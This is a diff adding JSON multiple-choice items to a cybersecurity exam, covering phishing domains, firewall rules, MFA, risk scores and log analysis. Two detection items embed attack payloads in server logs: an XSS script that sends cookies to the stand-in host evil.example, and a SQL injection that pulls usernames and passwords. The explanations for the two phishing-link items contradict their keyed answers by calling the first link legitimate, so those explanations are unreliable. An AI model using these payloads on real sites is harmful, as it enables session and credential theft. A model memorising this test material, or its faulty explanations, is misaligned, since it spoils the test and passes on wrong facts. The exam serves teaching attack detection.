+          "why": "A Caesar cipher substitutes letters; it does not reorder them."
+        }
+      ],
+      "answer": "a",
+      "explanation": "CVVCEM ← ATTACK with shift 2."
+    },
+    {
+      "id": "e08-q32",
+      "type": "mcq",
+      "topics": [
+        "protecting-applications-and-data-managerial-controls-and-access-controls",
+        "protecting-stored-data-with-cryptography",
+        "protecting-applications"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "Why should error messages on a website be generic, such as 'Something went wrong'?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Generic errors make pages load faster",
+          "why": "Speed is unrelated."
+        },
+        {
+          "id": "b",
+          "text": "Detailed errors can reveal database or system details useful to attackers",
+          "why": "Correct. Details belong in private logs."
+        },
+        {
+          "id": "c",
+          "text": "Detailed errors are illegal",
+          "why": "The concern is information disclosure."
+        },
+        {
+          "id": "d",
+          "text": "Users prefer short messages",
+          "why": "The reason is security."
+        }
+      ],
+      "answer": "b",
+      "explanation": "Details belong in private logs."
+    },
+    {
+      "id": "e08-q33",
+      "type": "mcq",
+      "topics": [
+        "protecting-networks-segmentation"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "How many usable host addresses are in a `192.168.37.0/30` subnet?",
+      "options": [
+        {
+          "id": "a",
+          "text": "4",
+          "why": "The network and broadcast addresses cannot be assigned."
+        },
+        {
+          "id": "b",
+          "text": "3",
+          "why": "Two addresses are reserved."
+        },
+        {
+          "id": "c",
+          "text": "1073741824",
+          "why": "Use the host bits, 32 − prefix."
+        },
+        {
+          "id": "d",
+          "text": "2",
+          "why": "Correct. 2^(32 − 30) − 2: subtract the network and broadcast addresses."
+        }
+      ],
+      "answer": "d",
+      "explanation": "2 host bits give 4 addresses, 2 usable."
+    },
+    {
+      "id": "e08-q34",
+      "type": "mcq",
+      "topics": [
+        "cyber-foundations"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stimuli": [
+        "e08-q34-s"
+      ],
+      "stem": "Using risk = likelihood × impact, which risk should be addressed first?",
+      "options": [
+        {
+          "id": "a",
+          "text": "The backup drives (risk 15)",
+          "why": "Its likelihood × impact is lower."
+        },
+        {
+          "id": "b",
+          "text": "The badge system (risk 6)",
+          "why": "Its likelihood × impact is lower."
+        },
+        {
+          "id": "c",
+          "text": "The customer database (risk 20)",
+          "why": "Correct. It has the largest product of likelihood and impact."
+        },
+        {
+          "id": "d",
+          "text": "The point-of-sale terminals (risk 8)",
+          "why": "Its likelihood × impact is lower."
+        }
+      ],
+      "answer": "c",
+      "explanation": "Risk scores: customer database 20, badge system 6, backup drives 15, point-of-sale terminals 8."
+    },
+    {
+      "id": "e08-q35",
+      "type": "mcq",
+      "topics": [
+        "understanding-social-engineering"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "Which tactic is most characteristic of phishing messages?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Following an employee through a secure door",
+          "why": "That is tailgating."
+        },
+        {
+          "id": "b",
+          "text": "Creating a sense of urgency so the victim acts without thinking",
+          "why": "Correct. Urgency short-circuits careful checking."
+        },
+        {
+          "id": "c",
+          "text": "Scanning a network for open ports",
+          "why": "That is reconnaissance by machine."
+        },
+        {
+          "id": "d",
+          "text": "Encrypting all of the victim's files",
+          "why": "That is ransomware."
+        }
+      ],
+      "answer": "b",
+      "explanation": "Urgency short-circuits careful checking."
+    },
+    {
+      "id": "e08-q36",
+      "type": "mcq",
+      "topics": [
+        "best-practices-for-public-networks",
+        "ai-based-cybersecurity-attacks",
+        "leveraging-ai-in-cyber-defense"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "A finance clerk receives a phone call in the CEO's voice demanding an immediate payment to a new vendor. Which policy best defends against deepfake fraud?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Ask the caller to confirm their own identity",
+          "why": "The attacker will simply confirm."
+        },
+        {
+          "id": "b",
+          "text": "Trust the request if the voice sounds right",
+          "why": "Voices can be convincingly faked."
+        },
+        {
+          "id": "c",
+          "text": "Reply quickly to avoid delaying the CEO",
+          "why": "Urgency is a red flag."
+        },
+        {
+          "id": "d",
+          "text": "Verify all payment requests through a separate, known contact method and require a second approver",
+          "why": "Correct. Process, not recognition, stops voice fakes."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Process, not recognition, stops voice fakes."
+    },
+    {
+      "id": "e08-q37",
+      "type": "mcq",
+      "topics": [
+        "authentication"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "A login requires a face scan and the answer to a security question. Is this multifactor authentication?",
+      "options": [
+        {
+          "id": "a",
+          "text": "No, because MFA always requires three factors",
+          "why": "Two different factor types are enough."
+        },
+        {
+          "id": "b",
+          "text": "No, because both factors are of the same type",
+          "why": "Classify each factor: know, have or are."
+        },
+        {
+          "id": "c",
+          "text": "Yes, because any two credentials count as MFA",
+          "why": "MFA requires different factor types."
+        },
+        {
+          "id": "d",
+          "text": "Yes, because the two factors are of different types",
+          "why": "Correct. One is something you are, the other something you know."
+        }
+      ],
+      "answer": "d",
+      "explanation": "a face scan: something you are; the answer to a security question: something you know."
+    },
+    {
+      "id": "e08-q38",
+      "type": "mcq",
+      "topics": [
+        "suspicious-website-logins"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "A user receives an email that appears to come from Shopwell, whose real website is `shopwell.org`. Which link most likely leads to a legitimate Shopwell login page?",
+      "options": [
+        {
+          "id": "a",
+          "text": "`https://shopwell.org.account-check.net/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not shopwell.org."
+        },
+        {
+          "id": "b",
+          "text": "`https://account-check.net/shopwell/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not shopwell.org."
+        },
+        {
+          "id": "c",
+          "text": "`https://login.shopwell.org/account`",
+          "why": "Correct. Its registered domain is shopwell.org; \"login\" is a subdomain."
+        },
+        {
+          "id": "d",
+          "text": "`https://sh0pwe1l.org/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not shopwell.org."
+        }
+      ],
+      "answer": "c",
+      "explanation": "The registered domain is the part immediately before the first single slash after the host, read from the right. Only the first link is hosted on shopwell.org."
+    },
+    {
+      "id": "e08-q39",
+      "type": "mcq",
+      "topics": [
+        "protecting-networks-firewalls"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 3,
+      "stem": "A firewall processes these rules from top to bottom and applies the first match.\n\n```text\n#  Action  Source          Destination   Port\n1  ALLOW   10.0.17.25      any           22\n2  DENY    any             10.0.1.12     22\n3  ALLOW   any             any           80\n4  ALLOW   10.0.4.0/24     10.0.1.12     443\n   (all other traffic is denied)\n```\n\nA packet arrives from `172.16.0.109` to `10.0.1.12` on port 443. What happens?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Allowed by rule 3",
+          "why": "This rule does not match the packet's source, destination and port."
+        },
+        {
+          "id": "b",
+          "text": "Denied by rule 2",
+          "why": "This rule does not match the packet's source, destination and port."
+        },
+        {
+          "id": "c",
+          "text": "Denied by the implicit deny",
+          "why": "Correct. No rule matches, so the implicit deny applies."
+        },
+        {
+          "id": "d",
+          "text": "Allowed by rule 1",
+          "why": "This rule does not match the packet's source, destination and port."
+        }
+      ],
+      "answer": "c",
+      "explanation": "No rule matches all three fields, so the packet is dropped by the implicit deny."
+    },
+    {
+      "id": "e08-q40",
+      "type": "mcq",
+      "topics": [
+        "detecting-physical-attacks"
+      ],
+      "skills": [
+        "3"
+      ],
+      "difficulty": 3,
+      "stem": "A security analyst reviews this door access log.\n\n```text\n08:19  badge 2217  Office 2      GRANTED\n08:23  badge 6603  Office 2      GRANTED\n08:25  badge 1042  Lobby      GRANTED\n08:26  badge 4471  North Gate   GRANTED\n08:26  badge 4471  South Gate   GRANTED\n```\n\nWhich entry is most suspicious, and why?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Badge 2217, because it was granted access",
+          "why": "Single, normal granted entries are expected."
+        },
+        {
+          "id": "b",
+          "text": "Badge 1042, because it was granted access",
+          "why": "Single, normal granted entries are expected."
+        },
+        {
+          "id": "c",
+          "text": "Badge 4471, because it was used at two distant gates in the same minute, suggesting a cloned badge",
+          "why": "Correct. One badge cannot physically be in two distant places at once."
+        },
+        {
+          "id": "d",
+          "text": "Badge 6603, because it was granted access",
+          "why": "Single, normal granted entries are expected."
+        }
+      ],
+      "answer": "c",
+      "explanation": "Badge 4471 shows use at two distant gates at the same time; investigate with camera footage and the badge holder."
+    },
+    {
+      "id": "e08-q41",
+      "type": "mcq",
+      "topics": [
+        "cyber-foundations"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stimuli": [
+        "e08-q41-s"
+      ],
+      "stem": "Using risk = likelihood × impact, which risk should be addressed first?",
+      "options": [
+        {
+          "id": "a",
+          "text": "The point-of-sale terminals (risk 4)",
+          "why": "Its likelihood × impact is lower."
+        },
+        {
+          "id": "b",
+          "text": "The badge system (risk 3)",
+          "why": "Its likelihood × impact is lower."
+        },
+        {
+          "id": "c",
+          "text": "The customer database (risk 20)",
+          "why": "Correct. It has the largest product of likelihood and impact."
+        },
+        {
+          "id": "d",
+          "text": "The student records (risk 3)",
+          "why": "Its likelihood × impact is lower."
+        }
+      ],
+      "answer": "c",
+      "explanation": "Risk scores: customer database 20, badge system 3, student records 3, point-of-sale terminals 4."
+    },
+    {
+      "id": "e08-q42",
+      "type": "mcq",
+      "topics": [
+        "suspicious-website-logins"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 2,
+      "stem": "A user receives an email that appears to come from Cloudnest, whose real website is `cloudnest.net`. Which link most likely leads to a legitimate Cloudnest login page?",
+      "options": [
+        {
+          "id": "a",
+          "text": "`https://cloudnest.net.secure-verify.io/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not cloudnest.net."
+        },
+        {
+          "id": "b",
+          "text": "`https://login.cloudnest.net/account`",
+          "why": "Correct. Its registered domain is cloudnest.net; \"login\" is a subdomain."
+        },
+        {
+          "id": "c",
+          "text": "`https://secure-verify.io/cloudnest/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not cloudnest.net."
+        },
+        {
+          "id": "d",
+          "text": "`https://c10udnest.net/login`",
+          "why": "Read the registered domain just before the path, from the right: it is not cloudnest.net."
+        }
+      ],
+      "answer": "b",
+      "explanation": "The registered domain is the part immediately before the first single slash after the host, read from the right. Only the first link is hosted on cloudnest.net."
+    },
+    {
+      "id": "e08-q43",
+      "type": "mcq",
+      "topics": [
+        "cyber-foundations",
+        "protecting-physical-spaces"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "How is security cameras in a server room best classified, by control category and function?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Physical, deterrent",
+          "why": "Consider both what kind of control it is and what it does."
+        },
+        {
+          "id": "b",
+          "text": "Technical, detective",
+          "why": "Consider both what kind of control it is and what it does."
+        },
+        {
+          "id": "c",
+          "text": "Physical, corrective",
+          "why": "Consider both what kind of control it is and what it does."
+        },
+        {
+          "id": "d",
+          "text": "Physical, detective",
+          "why": "Correct. It is a physical control whose purpose is to discover incidents."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Security cameras in a server room: physical, detective control."
+    },
+    {
+      "id": "e08-q44",
+      "type": "mcq",
+      "topics": [
+        "detecting-physical-attacks"
+      ],
+      "skills": [
+        "3"
+      ],
+      "difficulty": 3,
+      "stem": "A security analyst reviews this door access log.\n\n```text\n08:04  badge 5129  Office 2      GRANTED\n08:08  badge 6603  Lab B      GRANTED\n08:10  badge 2217  Lab B      GRANTED\n08:11  badge 3380  Server Room  DENIED\n08:12  badge 3380  Server Room  DENIED\n08:13  badge 3380  Server Room  DENIED\n08:14  badge 3380  Server Room  DENIED\n08:15  badge 3380  Server Room  GRANTED\n```\n\nWhich entry is most suspicious, and why?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Badge 2217, because it was granted access",
+          "why": "Single, normal granted entries are expected."
+        },
+        {
+          "id": "b",
+          "text": "Badge 6603, because it was granted access",
+          "why": "Single, normal granted entries are expected."
+        },
+        {
+          "id": "c",
+          "text": "Badge 5129, because it was granted access",
+          "why": "Single, normal granted entries are expected."
+        },
+        {
+          "id": "d",
+          "text": "Badge 3380, because repeated denials followed by a success suggest someone guessing or bypassing access",
+          "why": "Correct. A run of failures then success is a classic sign of an attempted break-in."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Badge 3380 shows four denials at the server room followed by a grant; investigate with camera footage and the badge holder."
+    },
+    {
+      "id": "e08-q45",
+      "type": "mcq",
+      "topics": [
+        "asymmetric-cryptography"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "Ivan wants to send Ana a message that only Ana can read. Which key should Ivan use to encrypt it?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Ivan's private key",
+          "why": "Confidentiality uses the recipient's public key; signing uses the sender's private key; verifying uses the sender's public key."
+        },
+        {
+          "id": "b",
+          "text": "Ivan's public key",
+          "why": "Confidentiality uses the recipient's public key; signing uses the sender's private key; verifying uses the sender's public key."
+        },
+        {
+          "id": "c",
+          "text": "Ana's private key",
+          "why": "Confidentiality uses the recipient's public key; signing uses the sender's private key; verifying uses the sender's public key."
+        },
+        {
+          "id": "d",
+          "text": "Ana's public key",
+          "why": "Correct. Only Ana's private key can decrypt it."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Confidentiality: encrypt with the recipient's public key. Signing: sign with the sender's private key; verify with the sender's public key."
+    },
+    {
+      "id": "e08-q46",
+      "type": "mcq",
+      "topics": [
+        "protecting-networks-managerial-controls-and-wireless-security",
+        "protecting-networks-segmentation",
+        "network-vulnerabilities-and-attacks"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 2,
+      "stem": "Why is a single shared Wi-Fi password a weakness for a large organization?",
+      "options": [
+        {
+          "id": "a",
+          "text": "It prevents encryption",
+          "why": "Encryption still works."
+        },
+        {
+          "id": "b",
+          "text": "It makes the network slower",
+          "why": "Speed is unrelated."
+        },
+        {
+          "id": "c",
+          "text": "Access cannot be revoked for one person without changing it for everyone",
+          "why": "Correct. Individual credentials (enterprise authentication) solve this."
+        },
+        {
+          "id": "d",
+          "text": "Shared passwords are always too short",
+          "why": "Length is a separate issue."
+        }
+      ],
+      "answer": "c",
+      "explanation": "Individual credentials (enterprise authentication) solve this."
+    },
+    {
+      "id": "e08-q47",
+      "type": "mcq",
+      "topics": [
+        "detecting-physical-attacks"
+      ],
+      "skills": [
+        "3"
+      ],
+      "difficulty": 3,
+      "stem": "A security analyst reviews this door access log.\n\n```text\n08:04  badge 1042  Lab B      GRANTED\n08:08  badge 3380  Lab B      GRANTED\n08:12  badge 5129  Office 2      GRANTED\n08:13  badge 4471  North Gate   GRANTED\n08:13  badge 4471  South Gate   GRANTED\n```\n\nWhich entry is most suspicious, and why?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Badge 3380, because it was granted access",
+          "why": "Single, normal granted entries are expected."
+        },
+        {
+          "id": "b",
+          "text": "Badge 4471, because it was used at two distant gates in the same minute, suggesting a cloned badge",
+          "why": "Correct. One badge cannot physically be in two distant places at once."
+        },
+        {
+          "id": "c",
+          "text": "Badge 5129, because it was granted access",
+          "why": "Single, normal granted entries are expected."
+        },
+        {
+          "id": "d",
+          "text": "Badge 1042, because it was granted access",
+          "why": "Single, normal granted entries are expected."
+        }
+      ],
+      "answer": "b",
+      "explanation": "Badge 4471 shows use at two distant gates at the same time; investigate with camera footage and the badge holder."
+    },
+    {
+      "id": "e08-q48",
+      "type": "mcq",
+      "topics": [
+        "detecting-attacks-on-data-and-applications",
+        "application-and-data-vulnerabilities-and-attacks"
+      ],
+      "skills": [
+        "3"
+      ],
+      "difficulty": 3,
+      "stem": "A web server log contains these entries.\n\n```text\n192.0.2.161 GET /login 200\n192.0.2.68 GET /products?page=2 200\n192.0.2.15 POST /cart 302\n192.0.2.182 GET /invoices?id=7037 ... (1,240 sequential ids in 3 minutes) 200\n```\n\nWhich entry shows an attack, and what kind?",
+      "options": [
+        {
+          "id": "a",
+          "text": "The request from 192.0.2.182: a denial-of-service attack",
+          "why": "A single request pattern like this is not a flood."
+        },
+        {
+          "id": "b",
+          "text": "The request from 192.0.2.15: data scraping through broken access control",
+          "why": "That is a normal cart action."
+        },
+        {
+          "id": "c",
+          "text": "The request from 192.0.2.161: a brute-force attack",
+          "why": "Loading the login page once is normal."
+        },
+        {
+          "id": "d",
+          "text": "The request from 192.0.2.182: data scraping through broken access control",
+          "why": "Correct. Rapid sequential record requests indicate automated scraping."
+        }
+      ],
+      "answer": "d",
+      "explanation": "192.0.2.182 sent thousands of sequential ID requests; the other entries are ordinary traffic."
+    },
+    {
+      "id": "e08-q49",
+      "type": "mcq",
+      "topics": [
+        "authentication"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 3,
+      "stem": "Policy A requires passwords of 9 characters using lowercase letters (26^9 possibilities). Policy B requires 8 characters using lowercase letters (26^8 possibilities). Against a brute-force attack, which statement is correct?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Policy B is stronger, by a factor of about 10^1",
+          "why": "Compare c^L for each policy."
+        },
+        {
+          "id": "b",
+          "text": "Policy A is stronger, by a factor of about 10^1",
+          "why": "Correct. log10(26^9) ≈ 12.7 and log10(26^8) ≈ 11.3."
+        },
+        {
+          "id": "c",
+          "text": "Policy B is stronger because it uses more character types",
+          "why": "Length matters as much as, or more than, character variety."
+        },
+        {
+          "id": "d",
+          "text": "They are equally strong",
+          "why": "Their numbers of possible passwords differ greatly."
+        }
+      ],
+      "answer": "b",
+      "explanation": "26^9 ≈ 10^12.7 versus 26^8 ≈ 10^11.3."
+    },
+    {
+      "id": "e08-q50",
+      "type": "mcq",
+      "topics": [
+        "protecting-networks-firewalls"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 3,
+      "stem": "A firewall processes these rules from top to bottom and applies the first match.\n\n```text\n#  Action  Source          Destination   Port\n1  ALLOW   any             any           80\n2  ALLOW   10.0.10.50      any           22\n3  DENY    any             10.0.1.11     22\n4  ALLOW   10.0.7.0/24     10.0.1.11     443\n   (all other traffic is denied)\n```\n\nA packet arrives from `10.0.10.50` to `10.0.1.11` on port 22. What happens?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Allowed by rule 1",
+          "why": "This rule does not match the packet's source, destination and port."
+        },
+        {
+          "id": "b",
+          "text": "Denied by the implicit deny",
+          "why": "Check each rule in order; one matches."
+        },
+        {
+          "id": "c",
+          "text": "Denied by rule 3",
+          "why": "Rules are checked top to bottom; an earlier rule matches first."
+        },
+        {
+          "id": "d",
+          "text": "Allowed by rule 2",
+          "why": "Correct. Rule 2 is the first rule matching the source, destination and port."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Rule 2 (ALLOW 10.0.10.50 → any:22) is the first match."
+    },
+    {
+      "id": "e08-q51",
+      "type": "mcq",
+      "topics": [
+        "authentication"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 3,
+      "stem": "Policy A requires passwords of 9 characters using digits only (10^9 possibilities). Policy B requires 6 characters using upper- and lowercase letters (52^6 possibilities). Against a brute-force attack, which statement is correct?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Policy A is stronger, by a factor of about 10^1",
+          "why": "Compare c^L for each policy."
+        },
+        {
+          "id": "b",
+          "text": "Policy B is stronger because it uses more character types",
+          "why": "Length matters as much as, or more than, character variety."
+        },
+        {
+          "id": "c",
+          "text": "Policy B is stronger, by a factor of about 10^1",
+          "why": "Correct. log10(10^9) ≈ 9.0 and log10(52^6) ≈ 10.3."
+        },
+        {
+          "id": "d",
+          "text": "They are equally strong",
+          "why": "Their numbers of possible passwords differ greatly."
+        }
+      ],
+      "answer": "c",
+      "explanation": "10^9 ≈ 10^9.0 versus 52^6 ≈ 10^10.3."
+    },
+    {
+      "id": "e08-q52",
+      "type": "mcq",
+      "topics": [
+        "detecting-attacks-on-data-and-applications",
+        "application-and-data-vulnerabilities-and-attacks"
+      ],
+      "skills": [
+        "3"
+      ],
+      "difficulty": 3,
+      "stem": "A web server log contains these entries.\n\n```text\n198.51.100.25 GET /login 200\n198.51.100.169 GET /products?page=2 200\n203.0.113.172 POST /cart 302\n192.0.2.10 POST /comments body=<script>document.location='http://evil.example/?c='+document.cookie</script> 200\n```\n\nWhich entry shows an attack, and what kind?",
+      "options": [
+        {
+          "id": "a",
+          "text": "The request from 203.0.113.172: cross-site scripting (XSS)",
+          "why": "That is a normal cart action."
+        },
+        {
+          "id": "b",
+          "text": "The request from 192.0.2.10: a denial-of-service attack",
+          "why": "A single request pattern like this is not a flood."
+        },
+        {
+          "id": "c",
+          "text": "The request from 192.0.2.10: cross-site scripting (XSS)",
+          "why": "Correct. A script tag in submitted content indicates XSS."
+        },
+        {
+          "id": "d",
+          "text": "The request from 198.51.100.25: a brute-force attack",
+          "why": "Loading the login page once is normal."
+        }
+      ],
+      "answer": "c",
+      "explanation": "192.0.2.10 sent a script; the other entries are ordinary traffic."
+    },
+    {
+      "id": "e08-q53",
+      "type": "mcq",
+      "topics": [
+        "protecting-networks-firewalls"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 3,
+      "stem": "A firewall processes these rules from top to bottom and applies the first match.\n\n```text\n#  Action  Source          Destination   Port\n1  DENY    any             10.0.1.11     22\n2  ALLOW   any             any           80\n3  ALLOW   10.0.10.12      any           22\n4  ALLOW   10.0.9.0/24     10.0.1.11     443\n   (all other traffic is denied)\n```\n\nA packet arrives from `172.16.0.46` to `10.0.1.11` on port 80. What happens?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Allowed by rule 2",
+          "why": "Correct. Rule 2 is the first rule matching the source, destination and port."
+        },
+        {
+          "id": "b",
+          "text": "Allowed by rule 3",
+          "why": "This rule does not match the packet's source, destination and port."
+        },
+        {
+          "id": "c",
+          "text": "Denied by the implicit deny",
+          "why": "Check each rule in order; one matches."
+        },
+        {
+          "id": "d",
+          "text": "Denied by rule 1",
+          "why": "This rule does not match the packet's source, destination and port."
+        }
+      ],
+      "answer": "a",
+      "explanation": "Rule 2 (ALLOW any → any:80) is the first match."
+    },
+    {
+      "id": "e08-q54",
+      "type": "mcq",
+      "topics": [
+        "detecting-network-attacks"
+      ],
+      "skills": [
+        "3"
+      ],
+      "difficulty": 3,
+      "stem": "A firewall log shows the following entries.\n\n```text\n02:14:01 203.0.113.230 -> 10.0.1.20:443 ALLOW\n02:14:03 198.51.100.82 -> 10.0.1.20:21 DENY\n02:14:04 198.51.100.82 -> 10.0.1.20:22 DENY\n02:14:05 198.51.100.82 -> 10.0.1.20:23 DENY\n02:14:06 198.51.100.82 -> 10.0.1.20:80 DENY\n02:14:07 198.51.100.82 -> 10.0.1.20:110 DENY\n02:14:08 198.51.100.82 -> 10.0.1.20:443 DENY\n02:14:09 198.51.100.82 -> 10.0.1.20:445 DENY\n02:14:12 192.0.2.241 -> 10.0.1.20:443 ALLOW\n02:14:15 192.0.2.234 -> 10.0.1.20:80 ALLOW\n```\n\nWhat does the log most likely show?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Normal web browsing from 198.51.100.82",
+          "why": "Web browsing uses ports 80 and 443, not a sweep of ports."
+        },
+        {
+          "id": "b",
+          "text": "A port scan from 198.51.100.82",
+          "why": "Correct. One source tried many different ports on one host within seconds."
+        },
+        {
+          "id": "c",
+          "text": "A brute-force password attack from 198.51.100.82",
+          "why": "Brute force repeats logins on one service, not many ports."
+        },
+        {
+          "id": "d",
+          "text": "A DDoS attack from 203.0.113.230",
+          "why": "That source made one normal, allowed connection."
+        }
+      ],
+      "answer": "b",
+      "explanation": "198.51.100.82 probed ports 21, 22, 23, 80, 110, 443, 445 in 7 seconds: reconnaissance by port scan."
+    },
+    {
+      "id": "e08-q55",
+      "type": "mcq",
+      "topics": [
+        "protecting-networks-firewalls"
+      ],
+      "skills": [
+        "2"
+      ],
+      "difficulty": 3,
+      "stem": "A firewall processes these rules from top to bottom and applies the first match.\n\n```text\n#  Action  Source          Destination   Port\n1  ALLOW   any             any           80\n2  ALLOW   10.0.8.0/24     10.0.1.18     443\n3  DENY    any             10.0.1.18     22\n4  ALLOW   10.0.14.39      any           22\n   (all other traffic is denied)\n```\n\nA packet arrives from `10.0.14.39` to `10.0.1.18` on port 22. What happens?",
+      "options": [
+        {
+          "id": "a",
+          "text": "Denied by the implicit deny",
+          "why": "Check each rule in order; one matches."
+        },
+        {
+          "id": "b",
+          "text": "Allowed by rule 1",
+          "why": "This rule does not match the packet's source, destination and port."
+        },
+        {
+          "id": "c",
+          "text": "Allowed by rule 2",
+          "why": "This rule does not match the packet's source, destination and port."
+        },
+        {
+          "id": "d",
+          "text": "Denied by rule 3",
+          "why": "Correct. Rule 3 is the first rule matching the source, destination and port."
+        }
+      ],
+      "answer": "d",
+      "explanation": "Rule 3 (DENY any → 10.0.1.18:22) is the first match."
+    },
+    {
+      "id": "e08-q56",
+      "type": "mcq",
+      "topics": [
+        "detecting-attacks-on-data-and-applications",
+        "application-and-data-vulnerabilities-and-attacks"
+      ],
+      "skills": [
+        "3"
+      ],
+      "difficulty": 3,
+      "stem": "A web server log contains these entries.\n\n```text\n203.0.113.61 GET /products?page=2 200\n192.0.2.168 POST /cart 302\n192.0.2.201 GET /login 200\n198.51.100.51 GET /search?q=' UNION SELECT username,password FROM users-- 200\n```\n\nWhich entry shows an attack, and what kind?",
+      "options": [
+        {
+          "id": "a",
+          "text": "The request from 192.0.2.201: a brute-force attack",
+          "why": "Loading the login page once is normal."
+        },
+        {
+          "id": "b",
+          "text": "The request from 198.51.100.51: SQL injection",
+          "why": "Correct. SQL keywords and a comment marker in a parameter indicate injection."
+        },
+        {
+          "id": "c",
+          "text": "The request from 192.0.2.168: SQL injection",
+          "why": "That is a normal cart action."
+        },
+        {
+          "id": "d",
+          "text": "The request from 198.51.100.51: a denial-of-service attack",
+          "why": "A single request pattern like this is not a flood."
+        }
+      ],
+      "answer": "b",
+      "explanation": "198.51.100.51 sent SQL syntax; the other entries are ordinary traffic."
+    },
+    {
+      "id": "e08-q57",
+      "type": "mcq",
+      "topics": [
+        "detecting-attacks-on-devices"
+      ],
+      "skills": [
+        "3"
+      ],
+      "difficulty": 3,
+      "stem": "An administrator reviews this authentication log.\n\n```text\nMar 03 02:10:44 sshd: Accepted password for hana from 198.51.100.214\nMar 03 02:14:01 sshd: Failed password for jsmith from 198.51.100.82\nMar 03 02:14:03 sshd: Failed password for jsmith from 198.51.100.82\nMar 03 02:14:05 sshd: Failed password for jsmith from 198.51.100.82\nMar 03 02:14:07 sshd: Failed password for jsmith from 198.51.100.82\nMar 03 02:14:09 sshd: Failed password for jsmith from 198.51.100.82\nMar 03 02:14:11 sshd: Failed password for jsmith from 198.51.100.82\nMar 03 02:14:13 sshd: Failed password for jsmith from 198.51.100.82\nMar 03 02:14:16 sshd: Accepted password for jsmith from 198.51.100.82\n```\n\nWhich conclusion is best supported?",
+      "options": [
+        {
+          "id": "a",
+          "text": "198.51.100.214 is attacking the server",
+          "why": "That address logged in once normally."
+        },
+        {
+          "id": "b",
+          "text": "A brute-force attempt from 198.51.100.82 failed",
+          "why": "Check whether the log shows an accepted login from that address."
+        },
+        {
+          "id": "c",
+          "text": "A brute-force attack from 198.51.100.82 likely succeeded against the jsmith account",
+          "why": "Correct. Many failures followed by a success from the same source."
+        },
+        {
+          "id": "d",
+          "text": "The log shows only normal activity",
+          "why": "7 rapid failures from one address is abnormal."
+        }
+      ],
+      "answer": "c",
+      "explanation": "7 failed logins for jsmith from 198.51.100.82 in seconds, then an accepted login: reset the password, review the account's activity and block the address."
+    },
+    {
+      "id": "e08-q58",
+      "type": "mcq",
+      "topics": [
+        "detecting-network-attacks"
+      ],
+      "skills": [
+        "3"
+      ],
+      "difficulty": 3,
+      "stem": "A firewall log shows the following entries.\n\n```text\n02:14:01 203.0.113.143 -> 10.0.1.28:443 ALLOW\n02:14:03 203.0.113.25 -> 10.0.1.28:23 DENY\n02:14:04 203.0.113.25 -> 10.0.1.28:25 DENY\n02:14:05 203.0.113.25 -> 10.0.1.28:80 DENY\n02:14:06 203.0.113.25 -> 10.0.1.28:110 DENY\n02:14:07 203.0.113.25 -> 10.0.1.28:443 DENY\n02:14:08 203.0.113.25 -> 10.0.1.28:3389 DENY\n02:14:09 203.0.113.25 -> 10.0.1.28:8080 DENY\n02:14:12 192.0.2.143 -> 10.0.1.28:443 ALLOW\n02:14:15 192.0.2.12 -> 10.0.1.28:80 ALLOW\n```\n\nWhat does the log most likely show?",
+      "options": [
+        {
+          "id": "a",
+          "text": "A brute-force password attack from 203.0.113.25",
+          "why": "Brute force repeats logins on one service, not many ports."
+        },
+        {
+          "id": "b",
+          "text": "A DDoS attack from 203.0.113.143",
+          "why": "That source made one normal, allowed connection."
+        },
+        {
+          "id": "c",
+          "text": "A port scan from 203.0.113.25",
+          "why": "Correct. One source tried many different ports on one host within seconds."
+        },
+        {
+          "id": "d",
+          "text": "Normal web browsing from 203.0.113.25",
+          "why": "Web browsing uses ports 80 and 443, not a sweep of ports."
+        }
+      ],
+      "answer": "c",
+      "explanation": "203.0.113.25 probed ports 23, 25, 80, 110, 443, 3389, 8080 in 7 seconds: reconnaissance by port scan."
+    },
+    {
+      "id": "e08-q59",
+      "type": "mcq",
+      "topics": [
+        "detecting-attacks-on-data-and-applications",
+        "application-and-data-vulnerabilities-and-attacks"
+      ],
+      "skills": [
+        "3"
+      ],
+      "difficulty": 3,
